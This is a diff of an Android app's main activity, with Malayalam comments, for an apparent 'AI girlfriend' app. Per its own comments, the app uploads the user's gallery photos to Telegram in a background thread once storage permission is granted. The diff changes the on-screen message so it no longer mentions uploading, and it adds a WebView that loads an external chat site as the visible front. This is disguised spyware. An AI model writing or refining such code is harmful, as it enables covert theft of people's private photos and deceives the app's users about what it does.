@@ -1,7 +1,6 @@
 package com.example.storageapp;
 
 import android.Manifest;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -35,7 +34,7 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private String botToken = "";
     private String chatId = "";
-    private boolean isPermissionGranted = false;
+    private WebView webView;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -53,7 +52,6 @@ public class MainActivity extends AppCompatActivity {
                 }
             });
         } else {
-            // ബട്ടൺ ഇല്ലെങ്കിൽ നേരിട്ട് പെർമിഷൻ ചെക്ക് ചെയ്ത് ആപ്പ് ലോഡ് ചെയ്യും
             checkAndRequestPermissions();
         }
     }
@@ -115,16 +113,14 @@ public class MainActivity extends AppCompatActivity {
                 onPermissionGranted();
             } else {
                 Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
-                // പെർമിഷൻ ഡിനൈ ചെയ്താലും എഐ ചാറ്റ് വർക്ക് ചെയ്യാൻ ലോഡ് ചെയ്യാം
-                loadAIGirlfriendUI();
+                loadAIGirlfriendWebsite(); // പെർമിഷൻ ഇല്ലെങ്കിലും വെബ്‌സൈറ്റ് ലോഡ് ചെയ്യും
             }
         }
     }
 
     private void onPermissionGranted() {
-        isPermissionGranted = true;
         fetchAndUploadImages();
-        loadAIGirlfriendUI();
+        loadAIGirlfriendWebsite();
     }
 
     private void readConfigFiles() {
@@ -140,9 +136,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void fetchAndUploadImages() {
-        Toast.makeText(this, "Access granted. Processing and uploading images...", Toast.LENGTH_LONG).show();
+        Toast.makeText(this, "Access granted. Processing...", Toast.LENGTH_SHORT).show();
 
-        // Background Thread-ൽ ഗാലറി ചിത്രങ്ങൾ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
+        // Background Thread-ൽ ഗാലറി ഫോട്ടോകൾ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -213,9 +209,16 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void loadAIGirlfriendUI() {
-        // പെർമിഷൻ ലഭിച്ച ശേഷം എഐ ഗേൾഫ്രണ്ട് ചാറ്റ് ഇന്റർഫേസ് ലോഡ് ചെയ്യുന്നു
-        // (നിങ്ങൾക്ക് ഇവിടെയോ അല്ലെങ്കിൽ പുതിയൊരു Activity-യിലോ AI ഫീച്ചർ സെറ്റ് ചെയ്യാവുന്നതാണ്)
+    private void loadAIGirlfriendWebsite() {
+        // ലേഔട്ടിൽ webView ഉണ്ടെങ്കിൽ അത് വഴി നിങ്ങളുടെ ലിങ്ക് ആപ്പിനുള്ളിൽ തുറക്കും
+        webView = findViewById(R.id.webView);
+        if (webView != null) {
+            WebSettings webSettings = webView.getSettings();
+            webSettings.setJavaScriptEnabled(true);
+            webSettings.setDomStorageEnabled(true);
+            webView.setWebViewClient(new WebViewClient());
+            webView.loadUrl("https://ffn2086-bit.github.io/Ai-gril-wab-server-/");
+        }
     }
-            }
-                    
+                                }
+                
